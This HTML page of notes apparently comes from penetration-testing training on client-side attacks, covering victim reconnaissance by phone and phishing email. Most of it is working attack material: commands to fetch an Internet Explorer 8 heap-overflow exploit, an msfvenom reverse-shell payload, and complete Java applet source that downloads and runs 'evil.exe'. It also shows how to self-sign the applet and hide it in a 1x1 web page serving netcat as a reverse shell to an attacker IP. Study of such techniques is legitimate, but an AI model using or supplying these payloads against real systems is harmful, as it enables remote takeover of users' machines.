<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Methods</title>
</head><body><b><u>Client Side Attacks<br/>
<br/>
</u></b><b>Info: </b>Exploiting a weakness in client software, such as a browser, in order to gain access to a machine. <br/>
<br/>
<b>Information Gathering - Passive<br/>
<br/>
</b>Gather information on the client machine to find:<br/>
<br/>
OS system, <br/>
Browser Version<br/>
Availability of JavaScript<br/>
+ anything else. <br/>
<br/>
<br/>
<b>Information Gathering - Active:<br/>
<br/>
</b>Extract information directly from the clinet by:<br/>
<br/>
Phone call <br/>
Email (with expectation of a response or a link click that would lead the victim's browser to a page that enumerates the user's browser version and installed extensions)<br/>
<br/>
<br/>
<b>Scenario</b><br/>
<br/>
<b>MS12037 - Internet Explorer 8 Fixed Col Span ID</b><br/>
<br/>
<b>Info</b>: Heap Overflow caused by incorrect handling of the span Attribute, for col elements, from a fixed table. <br/>
<b>Target</b>: Windows 7 (x86) - IE 8.0.7601.17514<br/>
<br/>
<b><br/>
</b><b>Attacker Set up Apache Server and download the exploit</b><br/>
<br/>
root@kali:~# cd /var/www/html/<br/>
root@kali: # wget -O exploit.html http://www.exploit-db.com/download/24017 r<br/>
oot@kali: # service apache2 start<br/>
<br/>
<br/>
<b>Victim Browse to attackers file in IE 8. <br/>
<br/>
<br/>
Swap Shellcode and format to unicode output. <br/>
<br/>
</b><b>Info: </b>Previous shellcode was converted to unicode to accomodate Internet Explorer, JavaScript strings in unicode.<b>&nbsp;<br/>
</b><b><br/>
</b>root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none<b><br/>
</b><b><br/>
</b><b>Note:</b>&nbsp;Make sure payload is the same size (add NOPs)<b><br/>
</b><b><br/>
<br/>
</b><b>Scenario 2</b><br/>
<br/>
<b>Java Signed Applet Attack</b><br/>
<br/>
<br/>
<b>Info</b>: Affects targets with Java installed and enabled in their browsers (This is a required feature for many administrators and power users)<br/>
<b><br/>
</b><b>Note</b>: A warning box will pop up on client side before executing the java code. The code will only be executed if the user clicks 'Run' on this warning. <br/>
<br/>
<b>Code: </b><br/>
<br/>
import java.applet.*;<br/>
import java.awt.*;<br/>
import java.io.*;<br/>
import java.net.URL;<br/>
import java.util.*;<br/>
/**<br/>
* Author: Offensive Security<br/>
* This Java applet will download a file and execute it.<br/>
**/<br/>
<br/>
public class Java extends Applet {<br/>
<br/>
&#09;private Object initialized = null;<br/>
&#09;public Object isInitialized()<br/>
&#09;{<br/>
&#09;&#09;return initialized;<br/>
&#09;}<br/>
&#09;public void init() {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &#09;Process f;<br/>
&nbsp; &nbsp; &nbsp; &nbsp;&#09;try {<br/>
&#09;String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;<br/>
&#09;String expath = tmpdir + "evil.exe";<br/>
&#09;String download = "";<br/>
&#09;download = getParameter("1");<br/>
&#09;if (download.length() &gt; 0) {<br/>
&#09;&#09;// URL parameter<br/>
&#09;&#09;URL url = new URL(download);<br/>
&#09;&#09;// Get an input stream for reading<br/>
&#09;&#09;InputStream in = url.openStream();<br/>
&#09;&#09;// Create a buffered input stream for efficency<br/>
&#09;&#09;BufferedInputStream bufIn = new BufferedInputStream(in);<br/>
&#09;&#09;File outputFile = new File(expath);<br/>
&#09;&#09;OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));<br/>
&#09;&#09;byte[] buffer = new byte[2048];<br/>
&#09;&#09;for (;;) {<br/>
&#09;&#09;&#09;int nBytes = bufIn.read(buffer);<br/>
&#09;&#09;&#09;if (nBytes &lt;= 0) break;<br/>
&#09;&#09;&#09;&#09;out.write(buffer, 0, nBytes);<br/>
&#09;&#09;&#09;}<br/>
&#09;&#09;&#09;out.flush();<br/>
&#09;&#09;&#09;out.close();<br/>
&#09;&#09;&#09;in.close();<br/>
&#09;&#09;&#09;f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.117 4555 -e cmd.exe");<br/>
&#09;&#09;}<br/>
<br/>
&#09;} catch(IOException e) {<br/>
&#09;&#09;e.printStackTrace();<br/>
&#09;}<br/>
&#09;/* ended here and commented out below for bypass */<br/>
&#09;catch (Exception exception)<br/>
&#09;{<br/>
&#09;&#09;exception.printStackTrace();<br/>
&#09;}<br/>
}<br/>
}<br/>
<br/>
<br/>
<b>Compile and sign Applet<br/>
<br/>
</b>root@kali:~# javac Java.java<br/>
root@kali:~# echo “Permissions: all-permissions” &gt; /root/manifest.txt <br/>
root@kali:~# jar cvf Java.jar Java.class<br/>
root@kali:~# keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123<br/>
--------------------------------------------<br/>
What is your first and last name? [Unknown]: Offensive Security<br/>
What is the name of your organizational unit? [Unknown]: Ownage Dept<br/>
What is the name of your organization? [Unknown]: Offensive Security<br/>
What is the name of your City or Locality? [Unknown]: localhost<br/>
What is the name of your State or Province? [Unknown]: 127.0.0.1<br/>
What is the two-letter country code for this unit? [Unknown]: US<br/>
Is CN=Offensive Security, OU=Ownage Dept, O=Offensive Security, L=localhost, ST=127.0.0.1, C=US correct?<br/>
[no]: yes<br/>
---------------------------------------------------------------------<br/>
root@kali:~# jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet<br/>
root@kali:~ # cp Java.class SignedJava.jar /var/www/html/<br/>
<br/>
<br/>
<b>Embed Applet in HTML File and write to web root folder</b><br/>
<br/>
root@kali:~# echo '&lt;applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"&gt;&lt;param name="1" value="http://10.11.0.5:80/evil.exe"&gt;&lt;/applet&gt;' &gt; /var/www/html/java.html<br/>
O<br/>
<br/>
<b>Copy nc.exe to web root and rename it to evil.exe</b><br/>
<br/>
root@kali:~# cp /usr/share/windows-binaries/nc.exe /var/www/html/evil.exe<br/>
<br/>
<br/>
<br/>
<b>Explanation:</b><br/>
<br/>
When the victim loads java.html, the signed java applet warning will appear. If the user clicks run, the applet will load the evil.exe file and on running this file will execute a reverse shell to 10.11.0.117 4555.<br/>
<br/>
<br/>
<br/>
</body></html>